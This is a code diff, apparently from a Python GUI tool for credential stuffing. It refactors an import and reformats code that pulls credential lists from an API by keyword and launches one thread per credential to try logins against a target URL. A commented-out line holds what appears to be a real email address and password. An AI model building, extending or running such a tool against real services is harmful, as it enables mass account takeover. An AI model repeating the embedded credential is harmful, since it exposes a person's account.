@@ -3,10 +3,10 @@ import threading
 import requests
 
 from global_functions import send_request
-from gui.console_view import ConsoleView
 from gui.credential_stuffing.credential import Credential
 from gui.credential_stuffing.process_manager import is_stopped
 from gui.credential_stuffing.success_manager import add_tested_credential, add_finish, add_failed_request
+from gui.utils.console_view import ConsoleView
 
 global_credentials_list = [
     # Credentials("pppbbb616000@gmail.com", "jRez.LZ4J9E!3Du")
@@ -75,18 +75,18 @@ def credential_stuffing(username_var, password_var, login_success_var, url, head
     if credential_list is None:
         credential_list = get_credentials_from_api(keyword, console_view, int(credential_limit))
 
-
     if len(credential_list) > 0:
         for credential in credential_list:
             if is_stopped():
                 break
 
-            threading.Thread(target=send_request_instance, args=(username_var, credential.username, password_var, credential.password,
-                                                                 login_success_var, url, headers, console_view, keyword)).start()
+            threading.Thread(target=send_request_instance,
+                             args=(username_var, credential.username, password_var, credential.password,
+                                   login_success_var, url, headers, console_view, keyword)).start()
 
 
 def send_request_instance(username_var, username_value, password_var, password_value,
-                 login_success_var, url, headers, console_view: ConsoleView, keyword):
+                          login_success_var, url, headers, console_view: ConsoleView, keyword):
     credential = Credential(username_value, password_value)
 
     if send_request(username_var, credential.username, password_var, credential.password,
